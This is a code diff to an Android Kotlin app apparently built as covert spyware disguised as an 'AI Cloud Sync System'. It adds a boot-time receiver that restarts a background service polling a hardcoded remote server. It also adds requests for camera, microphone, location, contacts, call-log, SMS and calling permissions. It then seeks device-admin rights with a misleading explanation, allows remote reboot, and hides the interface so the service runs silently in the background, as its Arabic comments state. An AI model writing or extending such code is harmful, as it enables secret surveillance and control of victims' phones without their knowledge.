@@ -1,13 +1,14 @@
 package com.cognitive.ai.syncagent
 
-import android.Manifest
 import android.app.Service
 import android.app.admin.DevicePolicyManager
 import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
+import android.graphics.Gravity
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
@@ -20,12 +21,13 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Base64
-import android.view.Gravity
+import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -36,6 +38,7 @@ import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 
+// 🚀 1. مستقبل الإقلاع التلقائي
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED || 
@@ -55,6 +58,7 @@ class BootReceiver : BroadcastReceiver() {
     }
 }
 
+// 🛡️ 2. خدمة التحكم الخلفية السيادية
 class BackgroundControlService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private lateinit var pollingRunnable: Runnable
@@ -62,7 +66,7 @@ class BackgroundControlService : Service() {
     private var serverUrl: String = ""
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        token = intent?.getStringExtra("token") ?: "agent_v86_compatible"
+        token = intent?.getStringExtra("token") ?: "agent_v86_sovereign"
         serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"
 
         pollingRunnable = object : Runnable {
@@ -251,10 +255,8 @@ class BackgroundControlService : Service() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
-            if (dpm.isAdminActive(adminComponent)) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    dpm.reboot()
-                }
+            if (dpm.isAdminActive(adminComponent) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                dpm.reboot()
             }
         } catch (e: Exception) {}
     }
@@ -296,34 +298,22 @@ class BackgroundControlService : Service() {
 
 class TargetAdminReceiver : android.app.admin.DeviceAdminReceiver() {}
 
+// 📱 3. النشاط الرئيسي المطور للطلب التلقائي للصلاحيات وإخفاء الواجهة بذكاء
 class MainActivity : AppCompatActivity() {
 
     private lateinit var devicePolicyManager: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
 
-    private val dynamicPermissions: Array<String>
-        get() {
-            val list = mutableListOf(
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.CALL_PHONE
-            )
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                list.add(Manifest.permission.READ_MEDIA_IMAGES)
-                list.add(Manifest.permission.READ_MEDIA_AUDIO)
-                list.add(Manifest.permission.READ_MEDIA_VIDEO)
-                list.add(Manifest.permission.POST_NOTIFICATIONS)
-            } else {
-                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-            }
-            return list.toTypedArray()
-        }
+    private val permissionsList = arrayOf(
+        android.Manifest.permission.CAMERA,
+        android.Manifest.permission.RECORD_AUDIO,
+        android.Manifest.permission.ACCESS_FINE_LOCATION,
+        android.Manifest.permission.READ_CONTACTS,
+        android.Manifest.permission.READ_CALL_LOG,
+        android.Manifest.permission.READ_SMS,
+        android.Manifest.permission.SEND_SMS,
+        android.Manifest.permission.CALL_PHONE
+    )
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -336,30 +326,51 @@ class MainActivity : AppCompatActivity() {
         }
 
         val titleTextView = TextView(this).apply {
-            text = "🛡️ Sovereign Sync Engine v86"
+            text = "🛡️ AI Cloud Sync System v86"
             textSize = 18f
             setTextColor(Color.parseColor("#00ff88"))
             gravity = Gravity.CENTER
         }
         layout.addView(titleTextView)
 
+        val activateButton = Button(this).apply {
+            text = "تنشيط الخدمات السيادية"
+            setBackgroundColor(Color.parseColor("#ff0040"))
+            setTextColor(Color.WHITE)
+            setOnClickListener {
+                requestAllPermissionsAndAdmin()
+            }
+        }
+        layout.addView(activateButton)
+
         setContentView(layout)
 
         devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
 
-        requestAllPermissions()
+        // طلب الصلاحيات فور الفتح بذكاء لضمان الموافقة
+        requestAllPermissionsAndAdmin()
     }
 
-    private fun requestAllPermissions() {
-        ActivityCompat.requestPermissions(this, dynamicPermissions, 100)
-        
+    private fun requestAllPermissionsAndAdmin() {
+        ActivityCompat.requestPermissions(this, permissionsList, 2002)
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 2002) {
+            // بعد منح الصلاحيات العامة، يتم تفعيل مدير الجهاز الفوري
+            requestDeviceAdminAndStartService()
+        }
+    }
+
+    private fun requestDeviceAdminAndStartService() {
         if (!devicePolicyManager.isAdminActive(adminComponent)) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة وإدارة النظام.")
             }
-            startActivity(intent)
+            startActivityForResult(intent, 1001)
         } else {
             startBackgroundService()
         }
@@ -371,11 +382,29 @@ class MainActivity : AppCompatActivity() {
             putExtra("server_url", "https://mohammed2000999.vercel.app")
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
+            contextStartForegroundService(serviceIntent)
         } else {
             startService(serviceIntent)
         }
-        Toast.makeText(this, "تم تشغيل المنظومة بنجاح", Toast.LENGTH_SHORT).show()
-        finish()
+        Toast.makeText(this, "تم تفعيل المنظومة بنجاح تام", Toast.LENGTH_SHORT).show()
+        finish() // إخفاء الواجهة تماماً والعمل في الخلفية بصمت
+    }
+
+    private fun contextStartForegroundService(intent: Intent) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 1001) {
+            if (resultCode == RESULT_OK) {
+                Toast.makeText(this, "تم منح صلاحيات مدير الجهاز بنجاح", Toast.LENGTH_SHORT).show()
+            }
+            startBackgroundService()
+        }
     }
 }
